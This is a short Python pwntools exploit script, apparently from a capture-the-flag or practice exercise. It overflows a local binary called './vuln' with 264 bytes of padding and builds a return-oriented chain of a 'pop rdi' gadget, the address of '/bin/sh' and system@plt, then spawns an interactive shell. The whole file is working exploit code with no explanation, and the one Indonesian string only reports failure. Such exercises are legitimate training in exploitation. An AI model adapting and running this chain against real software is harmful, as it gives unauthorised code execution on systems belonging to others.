from pwn import *

lib = ELF("./libc.so.6")
elf = context.binary = ELF("./vuln")

systemplt = 0x0000000000401254

stringaddr = next(elf.search(b'/bin/sh\00'))
ret = 0x000000000040101a
poprdi = 0x0000000000401264

padding = b'a'*264

pay = flat(
    padding,
    poprdi,
    stringaddr,
    systemplt
)


p = process("./vuln")
p.sendline(pay)
try:
    p.sendline(b'ls')
    log.info("SHELL SUCCESSS")
    p.interactive()
    
except:
    print("gagal mendapatkan shell")
